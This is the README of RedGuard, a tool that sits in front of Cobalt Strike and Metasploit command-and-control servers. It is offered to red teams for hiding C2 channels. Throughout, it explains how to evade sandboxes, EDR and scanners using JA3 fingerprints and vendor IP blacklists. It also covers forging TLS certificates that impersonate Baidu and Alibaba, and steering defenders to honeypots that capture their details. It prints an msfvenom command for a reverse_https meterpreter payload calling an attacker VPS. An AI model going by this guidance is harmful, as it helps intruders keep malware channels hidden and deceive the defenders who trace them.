<h1 align="center">RedGuard - Excellent C2 Front Flow Control tool</h1>

[![GitHub stars](https://img.shields.io/github/stars/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu) [![GitHub issues](https://img.shields.io/github/issues/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu/issues) [![GitHub release](https://img.shields.io/github/release/wikiZ/RedGuard)](https://github.com/knownsec/Kunyu/releases) [![](https://img.shields.io/badge/author-风起-blueviolet)](https://github.com/wikiZ)

--------------

English | [中文文档](https://github.com/wikiZ/RedGuard/blob/main/doc/README_CN.md)

![1653117445(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/42d448a4cd030c05bacb8bde759b5d8.png)

# 0x00 Introduction

## What is RedGuard

RedGuard, a derivative tool based on command and control (C2) front flow control technology, has a lighter design, efficient traffic interaction, and reliable compatibility with development in the go programming language.As cyber attacks are constantly evolving , the red and blue team exercises become progressively more complex, RedGuard is designed to provide a better C2 channel hiding solution for the red team, that provides the flow control for the C2 channel, blocks the "malicious" analysis traffic, and better completes the entire attack task.

RedGuard is a C2 front flow control tool that can avoid Blue Team, AVS, EDR, Cyberspace Search Engine detects.

## When is RedGuard Used?

- In the offensive and defensive exercise, the investigators attempting to do cyber attribution analyze C2 traffic connected to the attackers with the situational awareness platform
- Prevent malware sample analysis by identifying cloud sandboxes based on JA3 fingerprint libraries
- Block malicious requests to perform replay attacks and achieve obfuscation online
- Restrict access requests by whitelisting in the case of the IP of the connecting server is specified
- Prevent the scanning and identification of C2 facilities by cyberspace mapping technology, and redirect or intercept the traffic of scanning probes
- Supports front flow control for multiple C2 servers, and can realize domain fronting, load balancing connection to achieve hidden effect
- Able to perform regional host connection restriction according to the attribution of IP address by requesting IP reverse lookup API interface
- Resolve strong features of staged checksum8 rule path parsing without changing the source code.
- Analyze blue team traceability behavior through interception logs of target requests, which can be used to track peer connection events/issues
- With the ability to customize the time period for legal interaction of samples to realize the function of only conducting traffic interaction during the working time period
- Malleable C2 Profile parser capable of validating inbound HTTP/S requests strictly against malleable profile and dropping outgoing packets in case of violation (supports Malleable Profiles 4.0+)
- Built-in blacklist of IPV4 addresses for a large number of devices, honeypots, and cloud sandboxes associated with  cybersecurity vendors to automatically intercept redirection request traffic
- SSL certificate information and redirect URLs that can interact with samples through custom tools to avoid the fixed signature of tool traffic
- ..........

# 0x01 Install

You can directly download and use the compiled version, or you can download the go package remotely for independent compilation and execution.

```bash
git clone https://github.com/wikiZ/RedGuard.git
cd RedGuard
# You can also use upx to compress the compiled file size
go build -ldflags "-s -w" -trimpath
# Give the tool executable permission and perform initialization operations
chmod +x ./RedGuard&&./RedGuard

```

# 0x02 Configuration Description

## initialization

As shown in the figure below, Set executable permissions and initialize RedGuard. The first run will generate a configuration file in the current user home directory to achieve flexible function configuration. Configuration file name: **.RedGuard_CobaltStrike.ini**.

![1653117707(1).png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1692550594507.png)

**Configuration file content:**

![1653117707(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1692550409350.png)

The configuration options of cert are mainly for the configuration information of SSL certificate encrypted HTTPS communication between the sample and the C2 front infrastructure. The proxy is mainly used to configure the control options in the reverse proxy traffic. The specific use will be explained in detail below.

The SSL certificate encrypted HTTPS communication will be generated in the cert-rsa/ directory under the directory where RedGuard is executed. You can start and stop the basic functions of the tool by modifying the configuration file **(the serial number of the certificate is generated according to the timestamp , don't worry about being associated with this feature)**.If you want to use your own certificate,Just rename them to ca.crt and ca.key.

```bash
openssl x509 -in ca.crt -noout -text
```

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656308972417.jpg)

Random TLS JARM fingerprints are updated each time RedGuard is started to prevent this from being used to authenticate C2 infrastructure.

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/d2d8d30fcd349bd4567c685aaa93451.jpg)

In the case of using your own certificate, modify the HasCert parameter in the configuration file to `true` to prevent normal communication problems caused by the incompatibility of the CipherSuites encryption suite with the custom certificate caused by JARM obfuscation randomization.

```bash
# Whether to use the certificate you have applied for true/false
HasCert      = false
```

### Forged TLS certificates

When deploying a Domain fronting to hide C2 traffic, the accelerated domain name does not have HTTPS certificate information by default. This is obviously problematic, so you need to pay attention to configuring the certificate when configuring the domain name. This is also the default basis for determining whether the sample is domain front-end traffic.

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1.png)

[^Tencent Cloud]: Content Delivery Network Certificate Configuration

I believe that everyone will have some questions after reading this, **How to obtain the configured certificate? If you use your own application for the certificate, it will not meet the anonymity effect we expect. **Here you can use the cloned certificate for configuration. Taking Tencent Cloud as an example, it was found in the test that it would not verify the validity of the custom uploaded certificate. We can use the same certificate as the actual site of the accelerated domain name to forge it. Although the forged certificate cannot communicate when replacing the default certificate of CS under normal circumstances, it will not verify the validity when deployed on the cloud service provider CDN full-site acceleration and RedGuard, and C2 interactive traffic can communicate normally.

**The following is the existing project address on Github**

```bash
https://github.com/virusdefender/copy-cert
```

Although the certificate on the front-end traffic side of the sample domain has been resolved, from the perspective of large-scale network mapping, our C2 server is still exposed to the outside world and may still be detected and associated with the real C2 server. At this time, RedGuard can be used to modify the fronting default certificate of C2 to achieve anonymity.

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/2.png)

[^intelligence information]: TLS Certificates

The above is the effect of the forged certificate of the C2 server. It can be seen that it is credible and not expired in the intelligence of the Threatbook community. The main way to obtain the digital certificate is to extract and update it in real time during sample analysis in the cloud sandbox, but it is obviously not effectively verified. The status value only verifies the expiration time. The certificate trust verification should only be based on whether normal communication can be achieved.

It should be noted that Threatbook intelligence does not mark the SNI and HOST addresses of sample requests with certificate intelligence. This is actually to prevent false positives. I think this is correct. As an important basis for assisting researchers in analysis, threat intelligence is better to be incomplete than to point to the wrong direction, which will cause misjudgment in subsequent analysis. If configuring certificates for full-site acceleration is to forge certificates for communication traffic, then configuring the pre-response certificate of RedGuard C2 is to forge the behavioral characteristics of the real C2 server deployed on the public network to achieve anti-mapping effects, which is very necessary.

Extract the certificate serial number: `55e6acaed1f8a430f9a938c5`, and perform HEX encoding to obtain the TLS certificate fingerprint: `26585094245224241434632730821`

|       IP       | Port | Protocol |   Service    | Country |  City  |         Title         |    Time    |
| :------------: | :--: | :------: | :----------: | :-----: | :----: | :-------------------: | :--------: |
| 103.211.xx.90  | 443  |  https   | Apache httpd |  China  | Suzhou | 百度图片-发现多彩世界 | 2023-08-28 |
| 223.113.xx.207 | 443  |  https   |     JSP3     |  China  | Xuzhou |     403 Forbidden     | 2023-08-28 |
| 223.112.xx.48  | 443  |  https   |     JSP3     |  China  | Xuzhou |     403 Forbidden     | 2023-08-28 |
| 223.113.xx.40  | 443  |  https   |     JSP3     |  China  | Xuzhou |     403 Forbidden     | 2023-08-28 |
| 223.113.xx.31  | 443  |  https   |     JSP3     |  China  |        |    405 Not Allowed    | 2023-08-28 |
| 223.113.xx.206 | 443  |  https   |     JSP3     |  China  | Xuzhou |     403 Forbidden     | 2023-08-28 |

**Search Result Amount: 2291**

Through cyberspace mapping, 2,291 independent IP addresses were discovered, and verification confirmed that they all had TLS certificates belonging to Baidu. It is difficult to determine whether it is malicious communication based solely on the communication traffic. However, the TLS certificates for the domain front-end + C2 front-end traffic facilities were forged, successfully interfering with space mapping and threat intelligence, causing incorrect information association, making the attacker's traffic characteristics more realistic, and achieving the purpose of forging normal communication traffic.

![1653118330(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/3.png)

[^RedGuard]: RG asset using the default certificate

Even if there is no hidden forwarding processing before the C2 traffic front-end facility, it is best to change the certificate for RedGuard. By default, any fingerprint library formed by the fingerprint identification of common components currently used in cyberspace mapping uses the **behavior** of the default configuration characteristics of common components for identification. Different groups may show different unique characteristics during these customization processes. Of course, the formation of fingerprints requires a certain understanding of the target component, so as to extract the default characteristics of the target and form an associated fingerprint. Here, the behavioral characteristics of the RG certificate are used for cyberspace mapping, which is associated with a large number of RG nodes deployed on the public network.

**It is not surprising that the author was able to extract the fingerprint, but it is still recommended that RedGuard users modify the default certificate information and be a professional hacker:)**

## RedGuard Parameters

```bash
root@VM-4-13-ubuntu:~# ./RedGuard -h

Usage of ./RedGuard:
  -DelHeader string
        Customize the header to be deleted
  -DropAction string
        RedGuard interception action (default "redirect")
  -EdgeHost string
        Set Edge Host Communication Domain (default "*")
  -EdgeTarget string
        Set Edge Host Proxy Target (default "*")
  -FieldFinger string
        Set HTTP Header identification field Info
  -FieldName string
        Set the name of the HTTP Header identification field
  -HasCert string
        Whether to use the certificate you have applied for (default "true")
  -allowIP string
        Proxy Requests Allow IP (default "*")
  -allowLocation string
        Proxy Requests Allow Location (default "*")
  -allowTime string
        Proxy Requests Allow Time (default "*")
  -common string
        Cert CommonName (default "*.aliyun.com")
  -config string
        Set Config Path
  -country string
        Cert Country (default "CN")
  -dns string
        Cert DNSName
  -host string
        Set Proxy HostTarget
  -http string
        Set Proxy HTTP Port (default ":80")
  -https string
        Set Proxy HTTPS Port (default ":443")
  -ip string
        IPLookUP IP
  -locality string
        Cert Locality (default "HangZhou")
  -location string
        IPLookUP Location (default "风起")
  -malleable string
        Set Proxy Requests Filter Malleable File (default "*")
  -organization string
        Cert Organization (default "Alibaba (China) Technology Co., Ltd.")
  -redirect string
        Proxy redirect URL (default "https://360.net")
  -type string
        C2 Server Type (default "CobaltStrike")
  -u    Enable configuration file modification
```

**P.S. You can use the parameter command to modify the configuration file. Of course, I think it may be more convenient to modify it manually with vim.**

# 0x03 Tool usage

## basic interception

If you directly access the port of the reverse proxy, the interception rule will be triggered. Here you can see the root directory of the client request through the output log, but because the request does not carry the requested credentials that is the correct HOST request header, the basic interception rule is triggered, and the traffic is redirected to <https://360.net>

Here is just a demonstration of the output, the actual use can be run in the background through `nohup ./RedGuard &`.

![1653130661(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656309416534.png)

```bash
{"360.net":"http://127.0.0.1:8080","360.com":"https://127.0.0.1:4433"}
```

It is not difficult to see from the above slice that 360.net is proxied to the local port 8080, 360.com is proxied to the local port 4433, and the HTTP protocol used is also different. In actual use, it is necessary to pay attention to the protocol type of the listener. Consistent with the settings here, and set the corresponding HOST request header.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656309543334.jpg)

As shown in the figure above, in the case of unauthorized access, the response information we get is also the return information of the redirected site.

## interception method

In the above basic interception case, the default interception method is used, the illegal traffic is intercepted by redirection. By modifying the configuration file, we can change the interception method and the redirected site URL. In fact, rather than calling this a redirect, I think it might be more appropriate to describe it as hijacking, cloning, since the response status code returned is 200, and the response is obtained from another website to mimic the cloned/hijacked website as closely as possible.

Invalid packets can be incorrectly routed according to three strategies:

- **reset**: Disconnect the TCP connection immediately.
- **proxy**: Get a response from another website to mimic the cloned/hijacked website as closely as possible.
- **redirect**: redirect to the specified website and return HTTP status code 302, there is no requirement for the redirected website.

```bash
# RedGuard interception action: redirect / rest / proxy (Hijack HTTP Response)
drop_action   = proxy
# URL to redirect to
Redirect      = https://360.net
```

**Redirect = URL** in the configuration file points to the hijacked URL address. RedGuard supports "hot change", which means that while the tool is running in the background through `nohup`, we can still modify the configuration file. The content is started and stopped in real time.

```bash
./RedGuard -u --drop true
```

Note that when modifying the configuration file through the command line, The `-u` option should not be missing, otherwise the configuration file cannot be modified successfully. If you need to restore the default configuration file settings, you only need to enter `./RedGuard -u`.

Another interception method is DROP, which directly closes the HTTP communication response and is enabled by setting **DROP = true**. The specific interception effect is as follows:

![1653132755(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310664285.jpg)

It can be seen that the C2 front flow control directly close response to illegal requests without the HTTP response code. In the detection of cyberspace mapping, the DROP method can hide the opening of ports. The specific effect can be seen in the following case. analyze.

### Hijacking site responses

I believe that many users will be interested in **hijacking response**. The general principle is that when the client initiates a request to the real C2 server, since it does not meet the inbound rules, the C2 server will obtain the specified normal site and return its response information. Therefore, from the effect request end, it seems to be interacting with the IP service, but in fact, the intermediate C2 server is used as a proxy server to interact with the normal site, and it is difficult to find abnormalities. If it meets the inbound request, the traffic request will be forwarded to the real C2 service listening port for interaction, and the real listening port has been filtered by the cloud firewall, allowing only local access, and it cannot be directly accessed from the outside. **So from the perspective of external port opening, only the HTTP/S port is open, and in a sense, this is indeed the online port of C2. **

![1](https://github.com/wikiZ/RedGuardImage/blob/main/7.png?raw=true)

[^Traffic flow diagram]: C2 server traffic interaction process

In the cyberspace mapping data, the HTTP/S open port response code of the IP is 200, not a 307 jump, which is more authentic.

![1](https://github.com/wikiZ/RedGuardImage/blob/main/8.png?raw=true)

The HTTPS certificate has the same effect as the forged certificate mentioned above, and both are fingerprints of real certificates.

![1](https://github.com/wikiZ/RedGuardImage/blob/main/9.png?raw=true)

I believe that many red teams will widely use concealment methods such as cloud functions/domain fronting in the process of fighting projects. However, in today's offensive and defensive confrontation, the above two concealment methods have a fatal problem, that is, they can directly connect to the C2 service. The result is undoubtedly that when we grasp the cloud function address or the interactive IP/HOST of the domain fronting, we can directly access the C2 listening service and prove that it is an attack facility.

![1](https://github.com/wikiZ/RedGuardImage/blob/main/11.png?raw=true)

**Since the traffic can directly reach C2, it is worth considering whether the security device can perform CS scanning on the traffic that does not match the SNI and HOST to identify whether it is malicious traffic. The same is true for cloud functions or sandbox environments. In addition to the sample side, there can also be more traffic-level analysis processes. **

After the hijacking response, direct access to the HTTP service can interact with the website normally, but Cscan cannot scan out the sample information because the traffic cannot reach the real C2 listener. Normal C2 interaction is possible only when the characteristics of traffic initiation are met. However, there is a problem. The C2 scanning script needs to comply with the inbound rules, which puts a certain test on the coding ability of the blue team analysts. The currently public scanning script is in the form of Nmap.

![1](https://github.com/wikiZ/RedGuardImage/blob/main/12.png?raw=true)

## JA3 fingerprint recognition cloud sandbox analysis traffic

JA3 provides a more recognizable fingerprint for encrypted communications between clients and servers. It uses TLS fingerprints to identify TLS negotiations between malicious clients and servers, thereby achieving the effect of associating malicious clients. This fingerprint is easy to generate on any platform using MD5 encryption and is currently widely used in threat intelligence. For example, it can be seen in sample analysis reports of some sandboxes to prove the correlation between different samples.

If we can master the JA3(S) of the C2 server and the malicious client, even if the traffic is encrypted and the IP address or domain name of the C2 server is unknown, we can still identify the TLS negotiation between the malicious client and the server through TLS fingerprinting. **I believe that everyone can think of this after seeing this, which is also a measure to deal with traffic forwarding concealment methods such as domain fronting, reverse proxy, and cloud function. Through the sandbox execution sample identification and C2 communication TLS negotiation and generate JA3(S) fingerprints, which can be applied to threat intelligence to achieve auxiliary tracing. **

I announced this technology in 2022. When testing the micro-step sandbox environment, I found that although the number of egress IPs requesting interaction was small, it was not accurate to identify the sandbox by IP, and this was a feature that was easily changed, but its JA3 fingerprint was unique in the same system environment. Later, I received feedback that the sandbox had completed fingerprint randomization, but recent tests have found that it has not been fully implemented. I still hope to face the problem of fingerprints on the traffic side.

- **Threatbook Sandbox Currently mainly the following JA3 fingerprints:**
  - 55826aa9288246f7fcafab38353ba734

From the perspective of the cloud sandbox, by monitoring the traffic interaction between the sample and the C2 server, the JA3(S) fingerprint is generated to identify the malicious client and thus make an association. Thinking in reverse, as a traffic control facility in front of C2, we can also perform such operations to obtain the JA3 fingerprint of the client request. By debugging different sandbox environments, these JA3 fingerprints are obtained to form a fingerprint library, thereby forming a basic interception strategy.

Imagine that in the process of staged Trojan interaction, the loader will first pull the shellcode of the remote address. Then, when the traffic identifies that the request meets the cloud sandbox characteristics of the JA3 fingerprint library, it will intercept the subsequent requests. If the shellcode cannot be obtained, the entire loading process cannot be completed, and the sandbox naturally cannot fully analyze it. If the environment is a stageless Trojan, then the sandbox analysis will also not be able to be finally uploaded to the C2 server. I believe everyone has woken up from a sleep and found a lot of long-timed sandbox records hanging on the C2. Of course, in an ideal state, we can identify different sandbox environments, which mainly depends on the reliability of the fingerprint library.

During the test, I found that after adding the JA3 fingerprint of ZoomEye GO language request library to the fingerprint library and monitoring the RG request traffic, most of the requests triggered the basic interception of the JA3 fingerprint library feature. Here I guess that the underlying language of the surveying and mapping product is part of the scanning task implemented in GO language. Through a link, the scanning logic composed of different underlying languages finally completed the entire scanning task. This also explains why the scanning of some surveying and mapping products triggered the JA3 fingerprint interception feature of the GO language request library. **The recognition rule principle is the same as that of the cloud sandbox fingerprint. Both use the uniqueness of the request client environment and the request library. Unlike the PC side, the request environment of these products will basically not be changed at will, which also enables us to grasp its traffic side fingerprint and intercept**, so can we think about whether the security device can use the JA3 fingerprint of the active detection traffic as the basis for interception? Of course, when the business traffic is large, there may be a certain amount of false alarms. Here we only propose theoretically feasible product requirements.

**P.S. Users can also upload samples to the sandbox to obtain and verify their JA3 fingerprints and add them to the fingerprint library. It should be noted that it is meaningless if the sandbox only changes the JA3 fingerprint to not the above fingerprint. What really needs to be solved is that each time the sandbox performs dynamic analysis, it is not the same fingerprint, and its changes need to meet the requirements of not repeating as much as possible. If the repetition rate is high, it will still be used as a fingerprint. **

Currently supports the identification and interception of the threatbook cloud sandbox as an effect demonstration

![1653132755(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/ebd60b93323db5096328e8f20a2f1df.jpg)

## Proxy port modification

The configuration of the following two parameters in the configuration file realizes the effect of changing the reverse proxy port. It is recommended to use the default port hiding as long as it does not conflict with the current server port. If it must be modified, then pay attention to the `:` of the parameter value not to be missing

```bash
# HTTPS Reverse proxy port
Port_HTTPS = :443
# HTTP Reverse proxy port
Port_HTTP = :80
```

## RedGuard logs

The blue team tracing behavior is analyzed through the interception log of the target request, which can be used to track peer connection events/issues. The log file is generated in the directory where RedGuard is running, **file name: RedGuard.log**.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656310909975.jpg)

## RedGuard Obtain the real IP address

This section describes how to configure RG to obtain the real IP address of a request. You only need to add the following configuration to the profile of the C2 device, the real IP address of the target is obtained through the request header X-Forwarded-For.

```bash
http-config {
    set trust_x_forwarded_for "true";
}
```

## Request geographic restrictions

The configuration method takes `AllowLocation = Jinan, Beijing` as an example. Note that RedGuard provides two APIs for reverse IP attribution, one for users in mainland China and the other for users in non-mainland China, and can dynamically assign which API to use according to the input geographical domain name, if the target is China Then use Chinese for the set region, otherwise use English place names. It is recommended that users in mainland China use Chinese names, so that the accuracy of the attribution and the response speed of the API obtained by reverse query are the best choices.

P.S. Mainland Chinese users, do not use **AllowLocation = Jinan,beijing** this way! It doesn't make much sense, the first character of the parameter value determines which API to use!

```bash
# IP address owning restrictions example:AllowLocation = 山东，上海，杭州 or shanghai,beijing
AllowLocation = *
```

![1653134160(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311033506.jpg)

Before deciding to restrict the region, you can manually query the IP address by the following command.

```bash
./RedGuard --ip 111.14.218.206
./RedGuard --ip 111.14.218.206 --location shandong # Use overseas API to query
```

Here we set to allow only the Shandong region to go online

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521200158-d0d34d6c-d8fd-1.png)

**Legal traffic:**

![1653137496(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521205147-c6bb200a-d904-1.png)

**Illegal request area:**

![1653137621(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220521205347-0dbc1efa-d905-1.png)

Regarding the connections of geographical restrictions, it may be more practical in the current offensive and defensive exercise. Basically, the targets of provincial and municipal offensive and defensive exercise restrictions are in designated areas, and the traffic requested by other areas can naturally be ignored. This function of RedGuard can not only limit a single region, but also limit multiple connection regions according to provinces and cities, and intercept the traffic requested by other regions.

## Blocking based on whitelist

In addition to the built-in IP blacklist of cybersecurity vendors in RedGuard, we can also restrict according to the whitelist method. In fact, I also suggest that during web penetration, we can restrict the online IP addresses according to the whitelist to split multiple way of IP address.

```bash
# Whitelist list example: AllowIP = 172.16.1.1,192.168.1.1
AllowIP       = 127.0.0.1
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311197849.png)

As shown in the figure above, we restrict to allow only 127.0.0.1 connections, then the request traffic of other IPs will be blocked.

## Block based on time period

This function is more interesting. Setting the following parameter values in the configuration file means that the traffic control facility can only connect from 8:00 am to 9:00 pm. The specific application scenario here is that during the specified attack time, we allow communication with C2, and remains silent at other times. This also allows the red teams to get a good night's sleep without worrying about some blue team on duty at night being bored to analyze your Trojan and then wake up to something indescribable, hahaha.

```bash
# Limit the time of requests example: AllowTime = 8:00 - 16:00
AllowTime     = 8:00 - 21：00
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311327769.png)

## Malleable Profile

RedGuard uses the Malleable C2 profile. It parses the provided extensible configuration file section to understand the contract and pass only those inbound requests that satisfy it, while misleading other requests. Parts such as `http-stager`, `http-get` and `http-post` and their corresponding uris, headers, User-Agent etc. are used to distinguish legal beacon requests from irrelevant Internet noise or IR/AV/EDR Out-of-bounds packet.

```bash
# C2 Malleable File Path
MalleableFile = /root/cobaltstrike/Malleable.profile
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656311591693.png)

The profile written by 风起 is recommended to use:

> <https://github.com/wikiZ/CobaltStrike-Malleable-Profile>

## Custom Delete Response Fields

In Cobalt Strike 4.7+, Teamserver automatically removes the Content-Encoding header without any notification, potentially causing a malleable http-(get|post).server violation. Moreover, if there is no Content-type in the CS Server response message, but after being forwarded by RedGuard, the Content-Type is added to the response message header, causing cf to cache the page and causing interference.

After RedGuard 23.08.21, the function of customizing the header of the response packet has been added. Users can customize and delete the header information in the response packet by modifying the configuration file to solve the problem of incorrect parsing.

```bash
# Customize the header to be deleted example: Keep-Alive,Transfer-Encoding
DelHeader     = Keep-Alive,Transfer-Encoding
```

## Sample FingerPrint

RedGuard 23.05.13 has updated the trojan sample fingerprint recognition function, which is based on customizing the HTTP Header field of the Malleable Profile as the fingerprint “**sample salt value**” for uniquely identifying the same **C2 listener**/Header Host. In addition, the trojan sample fingerprint generated by combining other relevant request fields can be used to detect the custom sample liveliness. According to the attacker’s task requirements, the trojan sample fingerprint recognition function can perform “**offline operation**” on the samples you want to disable, to better evade malicious traffic analysis of the sample communication and the staged sample PAYLOAD attack payload acquisition analysis, and provide more personalized stealth measures for the attacker.

For different C2 listeners, we can give different aliases to the Malleable Profile configurations, customize the field names and values of related headers as the sample salt value, and use it as one of the distinctions between different samples. The following code is for illustration purposes, and in actual attack and defense scenarios we can use more realistic HTTP request packet fields as the basis for judgment.

```bash
http-get "listen2" {
	set uri "/image.gif";
	client {
		header "Accept-Finger" "866e5289337ab033f89bc57c5274c7ca"; //Custom HTTP Header and Value
		metadata {
			print
		}
	}
}
```

**HTTP traffic**

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/10b7b4d8f1d66bbf98e404332bf5d87.png)

As shown in the figure, we use the above sample Salt value and Host field as the basis for fingerprint generation. Here we know:

- **Salt Value：866e5289337ab033f89bc57c5274c7ca**
- **Host ：redguard.com**

According to splicing the above values, the sample fingerprint is obtained as follows:

```bash
22e6db08c5ef1889d64103a290ac145c
```

Now that we know the above sample fingerprint, we can set the custom Header field and sample fingerprint in the RedGuard configuration file for malicious traffic interception. It is worth noting that we can extend multiple sample fingerprints, separated by commas, and the FieldName needs to be consistent with the Header field name configured in the Malleable Profile

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/aa7488ece6370ff2559400a108664a4.png)

Because RedGuard’s configuration file is a hot configuration, we don’t need to restart RedGuard to intercept the samples we want to disable. When we want the sample to be reactivated, we just need to delete the relevant sample fingerprint from the RedGuard configuration file.

**Demonstration effect:**

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/4d37798254ba9b5729ac886f90a10f7.png)

# 0x04 Case Analysis

## CobaltStrike

If there is a problem with the above method, the actual online C2 server cannot be directly intercepted by the firewall, because the actual load balancing request in the reverse proxy is made by the IP of the cloud server manufacturer.

In single combat, we can set an interception rules on the cloud server firewall.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522150356-58b9586c-d99d-1.png)

Then set the address pointed to by the proxy to <https://127.0.0.1:4433>.

```bash
{"360.net":"http://127.0.0.1:8080","360.com":"https://127.0.0.1:4433"}
```

And because our basic verification is based on the HTTP HOST request header, what we see in the HTTP traffic is also the same as the domain fronting method, but the cost is lower, and only one cloud server is needed.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522150942-26f6c264-d99e-1.png)

For the listener settings, the `HTTPS Port (C2)` is set to the RedGuard reverse proxy port, and the `HTTPS Port (Bind)` is the actual connection port of the local machine.

## Metasploit

**Generates Trojan**

```bash
$ msfvenom -p windows/meterpreter/reverse_https LHOST=vpsip LPORT=443 HttpHostHeader=360.com 
-f exe -o ~/path/to/payload.exe
```

Of course, as a domain fronting scenario, you can also configure your LHOST to use any domain name of the manufacturer's CDN, and pay attention to setting the HttpHostHeader to match RedGuard.

```bash
setg OverrideLHOST 360.com
setg OverrideLPORT 443
setg OverrideRequestHost true
```

It is important to note that the `OverrideRequestHost` setting must be set to `true`. This is due to a feature in the way Metasploit handles incoming HTTP/S requests by default when generating configuration for staging payloads. By default, Metasploit uses the incoming request's `Host` header value (if present) for second-stage configuration instead of the `LHOST` parameter. Therefore, the build stage is configured to send requests directly to your hidden domain name because CloudFront passes your internal domain in the `Host` header of forwarded requests. This is clearly not what we are asking for. Using the `OverrideRequestHost` configuration value, we can force Metasploit to ignore the incoming `Host` header and instead use the `LHOST` configuration value pointing to the origin CloudFront domain.

The listener is set to the actual line port that matches the address RedGuard actually forwards to.

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/73315c83562826f16f64e2b277736c1.png)

RedGuard received the request:

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/159a00e6c5596bc3542701b4a8020b1.png)

## Cyberspace Search Mapping

As shown in the figure below, when our interception rule is set to DROP, the spatial mapping system probe will probe the / directory of our reverse proxy port several times. In theory, the request packet sent by mapping is faked as normal traffic as shown. But after several attempts, because the signature of the request packet do not meet the release requirements of RedGuard, they are all responded by Close HTTP. The final effect displayed on the surveying and mapping platform is that the reverse proxy port is not open.

![image.png](https://raw.githubusercontent.com/wikiZ/RedGuardImage/main/1656312184116.png)

The traffic shown in the figure below means that when the interception rule is set to Redirect, we will find that when the mapping probe receives a response, it will continue to scan our directory. User-Agent is random, which seems to be in line with normal traffic requests, but both successfully blocked.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656312557035.png)

**Mapping Platform - Hijack Response Intercept Mode Effect:**

![1653200439(1).jpg](https://github.com/wikiZ/RedGuardImage/raw/main/1656313188878.png)

**Surveying and mapping platform - effect of redirection interception:**

![1653200439(1).jpg](https://github.com/wikiZ/RedGuardImage/raw/main/1656406644535.jpg)

## Domain fronting

RedGuard supports Domain fronting. In my opinion, there are two forms of presentation. One is to use the traditional Domain fronting method, which can be achieved by setting the port of our reverse proxy in the site-wide acceleration back-to-origin address. On the original basis, the function of traffic control is added to the domain fronting, and it can be redirected to the specified URL according to the setting we set to make it look more real. It should be noted that the RedGuard setting of the HTTPS HOST header must be consistent with the domain name of the site-wide acceleration.

![1653201007(1).png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522143012-a26ab442-d998-1.png)

In single combat, I suggest that the above method can be used, and in team tasks, it can also be achieved by self-built "Domain fronting".

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/20220522143837-cf77a944-d999-1.png)

In the self-built Domain fronting, keep multiple reverse proxy ports consistent, and the HOST header consistently points to the real C2 server listening port of the backend. In this way, our real C2 server can be well hidden, and the server of the reverse proxy can only open the proxy port by configuring the firewall.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1656313773114.jpg)

This can be achieved through multiple node servers, and configure multiple IPs of our nodes in the CS listener HTTPS online IP.

## Honeypot malicious trap

**The principle of malicious honeypot trapping mainly relies on the hijacking response or redirection function of RG traffic guidance, which guides analysts who are evaluating C2 facilities to the address of the honeypot sandbox. In the hijacking response state, RG will direct request traffic that does not meet the inbound rules to the honeypot assets. **When encountering some more powerful honeypots (such as those that capture operator mobile phone numbers), the client will initiate a request according to the response of the target site and be hijacked by jsonp to obtain relevant information.

Imagine that when analysts directly access the C2 online port, they will be directed to the honeypot asset, which will undoubtedly cause disturbance to the analysts. The analysts are maliciously directed to request the honeypot asset, and the honeypot monitoring end captures the relevant information of the blue team analysts and traces the error. If the analysis target is wrong from the beginning, how can you get a good result? This will undoubtedly cause serious internal friction for the defense team.

**Here is a set of ZoomEye fingerprints associated with honeypot assets:**

```bash
(iconhash:"9fd6f0e56f12adfc2a4da2f6002fea7a" (title:"然之协同" +"iframe" +">v.ignoreNotice")) ("/static/js/2.ca599e2d.chunk.js?t=" +title:"OA办公系统") ("data.sloss.xyz/get_code.js?access") ("/monitordevinfo/common.js") (app:"honeyport" +country:china +after:"2022-08-22")
```

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/4.png)

The way to achieve this effect is very simple, you only need to change the relevant key values in the RG configuration file.

```bash
# RedGuard interception action: redirect / reset / proxy (Hijack HTTP Response)
drop_action   = proxy
# URL to redirect to
Redirect      = https://market.baidu.com
```

**P.S. I believe everyone knows how to configure it without explanation:)**

This method is a kind of cunning trick, which is more reflected in the idea. If it is further utilized, the honeypot capture function can be deployed in the C2 front-end traffic control facility and then interactive traffic can be directed. The effect is that the client's browser cache data can be obtained just like a traditional honeypot. However, I personally feel that in the public version, it may not be meaningful to apply it to the current attack and defense confrontation. It is meaningless for the attacker to capture the social information of the blue team analyst and then trace it. Of course, taking a step back, this may make the analysis of C2 samples more dangerous. When the attacker of the black and gray industries can obtain the virtual identity of the analyst, if the virtual and real identities can be converted, it is still relatively dangerous. **So I think that future research and analysis should be more cautious and vigilant. **

## C2 traffic based on edge node link interaction

